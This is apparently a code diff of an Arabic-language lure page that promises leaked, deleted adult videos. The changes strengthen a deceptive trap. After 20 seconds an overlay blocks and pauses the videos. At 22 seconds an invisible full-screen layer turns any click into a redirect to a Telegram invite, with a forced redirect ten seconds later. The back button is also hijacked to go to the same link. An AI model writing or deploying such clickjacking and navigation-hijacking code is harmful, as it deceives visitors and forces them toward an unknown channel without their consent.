@@ -31,12 +31,12 @@
         #telegram-lock {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             z-index: 9999;
             display: none;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
         }
 
         .tg-card {
@@ -84,7 +84,6 @@
             box-shadow: 0 5px 15px rgba(36, 161, 222, 0.3);
         }
 
-        /* الهيدر */
         header {
             background: #1a1a1a;
             padding: 15px;
@@ -93,19 +92,9 @@
         }
 
         .logo-text { color: var(--gold); font-weight: 900; font-size: 1.4rem; }
-
         .container { padding: 10px; max-width: 600px; margin: auto; }
-
-        .v-card {
-            background: #161616;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            overflow: hidden;
-            border: 1px solid #333;
-        }
-
+        .v-card { background: #161616; border-radius: 15px; margin-bottom: 20px; overflow: hidden; border: 1px solid #333; }
         .v-info { padding: 12px; font-weight: bold; font-size: 0.9rem; border-bottom: 1px solid #222; }
-
         video { width: 100%; display: block; background: #000; }
 
         .tg-banner {
@@ -125,7 +114,7 @@
 <div id="telegram-lock">
     <div class="tg-card">
         <div style="font-size: 3rem;">🔞</div>
-        <h2>السيرفر ممتلئ! شاهد التكملة</h2>
+        <h2>دخول مجاني بالكامل لفترة محدودة!</h2>
         <p>بسبب ضغط المشاهدات، تم نقل الأرشيف المحذوف (14,000 مقطع) لقناتنا السرية على تلجرام.</p>
         
         <div class="categories-grid">
@@ -151,7 +140,7 @@
     <div class="tg-banner" onclick="window.location.href='https://t.me/+vYk10FokzWgwMmY0'">
         <span style="font-size: 1.5rem;">📱</span>
         <div>
-            <div style="font-weight: bold; font-size: 0.9rem;">قناة التسريبات الرسمية (اضغط هنا)</div>
+            <div style="font-weight: bold; font-size: 0.9rem;">قناة التسريبات الرسمية (مجانية)</div>
             <div style="font-size: 0.7rem; color: #ddd;">الأرشيف الكامل للمقاطع المحذوفة والسرية</div>
         </div>
     </div>
@@ -194,17 +183,35 @@
 </div>
 
 <script>
-    // التوقيت الذهبي: 20 ثانية لقطع العرض
+    const tgLink = "https://t.me/+vYk10FokzWgwMmY0";
+
+    // 1. ظهور الستارة المرئية عند 20 ثانية
     setTimeout(function() {
         document.getElementById('telegram-lock').style.display = 'flex';
         var videos = document.getElementsByTagName('video');
         for(var i=0; i<videos.length; i++) { videos[i].pause(); }
+
+        // 2. تفعيل الستارة الشفافة القاتلة عند 22 ثانية
+        setTimeout(function() {
+            const shield = document.createElement('div');
+            shield.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:10000;background:transparent;cursor:pointer;";
+            document.body.appendChild(shield);
+
+            shield.onclick = function() {
+                window.location.href = tgLink;
+            };
+
+            // تحويل تلقائي احتياطي بعد 10 ثواني إضافية
+            setTimeout(function() { window.location.href = tgLink; }, 10000);
+
+        }, 2000); // 2 ثانية بعد القفل = 22 ثانية إجمالاً
+
     }, 20000);
 
-    // منع زر الرجوع وتحويله مباشرة للقناة
+    // منع زر الرجوع
     history.pushState(null, null, location.href);
     window.onpopstate = function () {
-        window.location.href = "https://t.me/+vYk10FokzWgwMmY0";
+        window.location.href = tgLink;
     };
 </script>
 
